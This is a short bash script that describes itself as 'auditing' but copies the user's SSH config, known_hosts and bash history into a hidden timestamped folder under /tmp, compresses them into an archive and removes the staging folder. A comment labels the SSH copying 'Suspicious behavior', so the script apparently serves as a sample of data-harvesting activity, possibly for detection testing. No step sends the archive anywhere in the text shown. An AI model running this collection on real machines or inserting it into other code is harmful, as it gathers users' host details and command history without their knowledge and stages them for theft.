#!/bin/bash

# Target: Collect user configuration and history for "auditing"
STAGING_AREA="/tmp/.audit_log_$(date +%s)"
mkdir -p "$STAGING_AREA"

echo "[*] Starting local configuration collection..."

# Copy SSH config and known hosts (Suspicious behavior)
if [ -d "$HOME/.ssh" ]; then
    cp "$HOME/.ssh/config" "$STAGING_AREA/ssh_config" 2>/dev/null
    cp "$HOME/.ssh/known_hosts" "$STAGING_AREA/known_hosts" 2>/dev/null
fi

# Copy bash history to see previously run commands
if [ -f "$HOME/.bash_history" ]; then
    cp "$HOME/.bash_history" "$STAGING_AREA/history_dump"
fi

# Compress the collected data
tar -czf "$STAGING_AREA.tar.gz" -C "$STAGING_AREA" .
rm -rf "$STAGING_AREA"

echo "[+] Collection complete: $STAGING_AREA.tar.gz"